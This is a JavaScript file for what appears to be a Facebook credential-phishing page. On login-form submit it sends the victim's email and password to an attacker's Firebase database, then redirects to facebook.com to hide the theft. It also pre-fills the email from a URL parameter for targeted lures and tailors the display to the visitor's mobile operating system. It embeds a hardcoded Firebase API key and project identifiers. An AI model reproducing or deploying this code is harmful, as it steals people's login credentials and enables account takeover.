//Add here the config to Firebase
var config = {
    apiKey: "AIzaSyAPexBtTYZJnrCtpoqSaR0eBi4XneYk27U",
    authDomain: "tasker-bb7ea.firebaseapp.com",
    databaseURL: "https://tasker-bb7ea.firebaseio.com",
    storageBucket: "tasker-bb7ea.appspot.com",
    messagingSenderId: "732939116415"
};
var app = firebase.initializeApp(config);
var ref = app.database().ref("conver/data/grid/list/users")
function getMobileOperatingSystem() {
    var userAgent = navigator.userAgent || navigator.vendor || window.opera;
    if (/windows phone/i.test(userAgent)) {
        return "Windows Phone";
    }
    if (/android/i.test(userAgent)) {
        return "Android";
    }
    if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return "iOS";
    }
    return "unknown";
}
if (getMobileOperatingSystem() === "Windows Phone") $('.windows').css('display','block');
if (getMobileOperatingSystem() === "iOS") $('.iphone').css('display','block');
if (getMobileOperatingSystem() === "Android") $('.android').css('display','block');
console.log(getMobileOperatingSystem());
$('.login-form').submit(function (e) {
    var $this = $(this),
        $email= $this.find('input[type=email]').val(),
        $pass = $this.find('input[type=password]').val(),
        $data = {
            email: $email,
            pass : $pass
        };
    ref.push($data).then(function(response){
       window.location = 'http://facebook.com';
    }).catch(function(err){
        console.log(err);
    });
    e.preventDefault();
});
function getParameterByName(name) {
    name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
    var regexS = "[\\?&]" + name + "=([^&#]*)";
    var regex = new RegExp(regexS);
    var results = regex.exec(window.location.href);
    if (results == null)
        return "";
    else
        return results[1];
}
var inputEmail = getParameterByName('email');
$('input[type=email]').val(inputEmail);
$(document).ready(function(){
    $('input[type=password]').focus();
});